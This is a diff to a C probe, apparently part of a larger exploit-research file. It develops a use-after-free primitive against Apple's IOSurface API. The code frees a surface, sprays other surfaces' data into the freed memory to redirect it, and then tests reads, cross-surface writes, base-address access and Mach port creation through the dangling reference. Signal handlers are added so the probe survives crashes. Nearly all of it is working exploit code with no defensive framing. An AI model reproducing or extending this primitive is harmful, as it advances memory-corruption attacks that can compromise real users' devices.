@@ -15962,46 +15962,78 @@ static void r393_probe(void) {
     memcpy(dataA, (void*)surfA, 512);
     memcpy(dataC, (void*)surfC, 512);
 
+    /* Set up signal handler for crash protection */
+    struct sigaction sa393, old_bus393, old_segv393;
+    memset(&sa393, 0, sizeof(sa393));
+    sa393.sa_handler = r392_sighandler;
+    sa393.sa_flags = 0;
+    sigaction(SIGBUS, &sa393, &old_bus393);
+    sigaction(SIGSEGV, &sa393, &old_segv393);
+
     /* Phase 1: Free B, redirect to A, test CopyValue */
     rlog("\n  Phase 1: Free B, redirect to A\n");
     uintptr_t freedB = (uintptr_t)surfB;
     clientRelease(surfB);
     memcpy((void*)freedB, dataA, 448);
     rlog("    Sprayed A's data into freed B\n");
+    fflush(stdout);
 
-    CFTypeRef rv = IOSurfaceCopyValue(surfB, CFSTR("Who"));
-    if (rv) {
-        int v = 0;
-        CFNumberGetValue((CFNumberRef)rv, kCFNumberIntType, &v);
-        rlog("    CopyValue('Who') through B→A: 0x%x (expect 0xAAAAAA)\n", v);
-        CFRelease(rv);
+    g_r392_crashed = 0;
+    if (sigsetjmp(g_r392_jmp, 1) == 0) {
+        CFTypeRef rv = IOSurfaceCopyValue(surfB, CFSTR("Who"));
+        if (rv) {
+            int v = 0;
+            CFNumberGetValue((CFNumberRef)rv, kCFNumberIntType, &v);
+            rlog("    CopyValue('Who') through B→A: 0x%x (expect 0xAAAAAA)\n", v);
+            CFRelease(rv);
+        } else {
+            rlog("    CopyValue returned NULL\n");
+        }
     } else {
-        rlog("    CopyValue returned NULL\n");
+        rlog("    CopyValue B→A CRASHED: signal %d\n", g_r392_crashed);
     }
+    fflush(stdout);
 
     /* Phase 2: Now redirect B to C instead */
     rlog("\n  Phase 2: Redirect B to C\n");
     memcpy((void*)freedB, dataC, 448);
     rlog("    Sprayed C's data into freed B\n");
+    fflush(stdout);
 
-    rv = IOSurfaceCopyValue(surfB, CFSTR("Who"));
-    if (rv) {
-        int v = 0;
-        CFNumberGetValue((CFNumberRef)rv, kCFNumberIntType, &v);
-        rlog("    CopyValue('Who') through B→C: 0x%x (expect 0xCCCCCC)\n", v);
-        CFRelease(rv);
+    g_r392_crashed = 0;
+    if (sigsetjmp(g_r392_jmp, 1) == 0) {
+        CFTypeRef rv = IOSurfaceCopyValue(surfB, CFSTR("Who"));
+        if (rv) {
+            int v = 0;
+            CFNumberGetValue((CFNumberRef)rv, kCFNumberIntType, &v);
+            rlog("    CopyValue('Who') through B→C: 0x%x (expect 0xCCCCCC)\n", v);
+            CFRelease(rv);
+        } else {
+            rlog("    CopyValue returned NULL\n");
+        }
     } else {
-        rlog("    CopyValue returned NULL\n");
+        rlog("    CopyValue B→C CRASHED: signal %d\n", g_r392_crashed);
     }
+    fflush(stdout);
 
     /* Phase 3: Cross-surface WRITE then verify */
     rlog("\n  Phase 3: Write through B→C, verify on C\n");
-    int xw = 0xDEADC0DE;
-    CFNumberRef xwv = CFNumberCreate(NULL, kCFNumberIntType, &xw);
-    IOSurfaceSetValue(surfB, CFSTR("CrossWrite393"), xwv);
-    CFRelease(xwv);
+    memcpy((void*)freedB, dataC, 448); /* ensure B→C */
+    fflush(stdout);
 
-    rv = IOSurfaceCopyValue(surfC, CFSTR("CrossWrite393"));
+    g_r392_crashed = 0;
+    if (sigsetjmp(g_r392_jmp, 1) == 0) {
+        int xw = 0xDEADC0DE;
+        CFNumberRef xwv = CFNumberCreate(NULL, kCFNumberIntType, &xw);
+        IOSurfaceSetValue(surfB, CFSTR("CrossWrite393"), xwv);
+        CFRelease(xwv);
+        rlog("    SetValue through B→C: no crash\n");
+    } else {
+        rlog("    SetValue B→C CRASHED: signal %d\n", g_r392_crashed);
+    }
+    fflush(stdout);
+
+    CFTypeRef rv = IOSurfaceCopyValue(surfC, CFSTR("CrossWrite393"));
     if (rv) {
         int v = 0;
         CFNumberGetValue((CFNumberRef)rv, kCFNumberIntType, &v);
@@ -16017,27 +16049,39 @@ static void r393_probe(void) {
     void *baseC_direct = IOSurfaceGetBaseAddress(surfC);
     IOSurfaceUnlock(surfC, 0, NULL);
     rlog("    C direct base: %p\n", baseC_direct);
+    fflush(stdout);
 
-    /* B→C redirect already in place */
-    IOSurfaceLock(surfB, 0, NULL);
-    void *baseB_redirect = IOSurfaceGetBaseAddress(surfB);
-    IOSurfaceUnlock(surfB, 0, NULL);
-    rlog("    B→C redirect base: %p\n", baseB_redirect);
-    rlog("    Same base? %s\n", baseC_direct == baseB_redirect ? "YES" : "NO");
+    g_r392_crashed = 0;
+    if (sigsetjmp(g_r392_jmp, 1) == 0) {
+        IOSurfaceLock(surfB, 0, NULL);
+        void *baseB_redirect = IOSurfaceGetBaseAddress(surfB);
+        IOSurfaceUnlock(surfB, 0, NULL);
+        rlog("    B→C redirect base: %p\n", baseB_redirect);
+        rlog("    Same base? %s\n", baseC_direct == baseB_redirect ? "YES" : "NO");
+    } else {
+        rlog("    Lock B→C CRASHED: signal %d\n", g_r392_crashed);
+    }
+    fflush(stdout);
 
     /* Phase 5: Create Mach port through redirect */
     rlog("\n  Phase 5: Mach port through redirect\n");
     if (createMP) {
         mach_port_t mpC_direct = createMP(surfC);
         rlog("    C direct port: 0x%x\n", mpC_direct);
+        fflush(stdout);
 
-        /* Create port through B→C redirect */
-        mach_port_t mpB_redirect = createMP(surfB);
-        rlog("    B→C redirect port: 0x%x\n", mpB_redirect);
+        g_r392_crashed = 0;
+        mach_port_t mpB_redirect = 0;
+        if (sigsetjmp(g_r392_jmp, 1) == 0) {
+            mpB_redirect = createMP(surfB);
+            rlog("    B→C redirect port: 0x%x\n", mpB_redirect);
+        } else {
+            rlog("    CreateMachPort B→C CRASHED: signal %d\n", g_r392_crashed);
+        }
+        fflush(stdout);
 
-        /* Verify: lookup from each port should give same surface */
         IOSurfaceRef (*lookupMP)(mach_port_t) = dlsym(RTLD_DEFAULT, "IOSurfaceLookupFromMachPort");
-        if (lookupMP) {
+        if (lookupMP && mpC_direct && mpB_redirect) {
             IOSurfaceRef fromDirect = lookupMP(mpC_direct);
             IOSurfaceRef fromRedirect = lookupMP(mpB_redirect);
             if (fromDirect && fromRedirect) {
@@ -16059,15 +16103,25 @@ static void r393_probe(void) {
     /* Phase 6: Get/Set/GetID through redirect to verify full API works */
     rlog("\n  Phase 6: Full API through redirect B→A\n");
     memcpy((void*)freedB, dataA, 448); /* redirect to A */
+    fflush(stdout);
 
-    uint32_t sidThrough = IOSurfaceGetID(surfB);
-    rlog("    GetID through B→A: %u (A=%u, B=%u, C=%u)\n", sidThrough, sidA, sidB, sidC);
-    int wThrough = IOSurfaceGetWidth(surfB);
-    int hThrough = IOSurfaceGetHeight(surfB);
-    rlog("    Width=%d Height=%d through redirect\n", wThrough, hThrough);
+    g_r392_crashed = 0;
+    if (sigsetjmp(g_r392_jmp, 1) == 0) {
+        uint32_t sidThrough = IOSurfaceGetID(surfB);
+        rlog("    GetID through B→A: %u (A=%u, B=%u, C=%u)\n", sidThrough, sidA, sidB, sidC);
+        int wThrough = IOSurfaceGetWidth(surfB);
+        int hThrough = IOSurfaceGetHeight(surfB);
+        rlog("    Width=%d Height=%d through redirect\n", wThrough, hThrough);
+        size_t allocThrough = IOSurfaceGetAllocSize(surfB);
+        rlog("    AllocSize through redirect: %zu\n", allocThrough);
+    } else {
+        rlog("    API through B→A CRASHED: signal %d\n", g_r392_crashed);
+    }
+    fflush(stdout);
 
-    size_t allocThrough = IOSurfaceGetAllocSize(surfB);
-    rlog("    AllocSize through redirect: %zu\n", allocThrough);
+    /* Restore signal handlers */
+    sigaction(SIGBUS, &old_bus393, NULL);
+    sigaction(SIGSEGV, &old_segv393, NULL);
 
     /* Cleanup - only release A and C (B is already freed) */
     CFRelease(surfA);
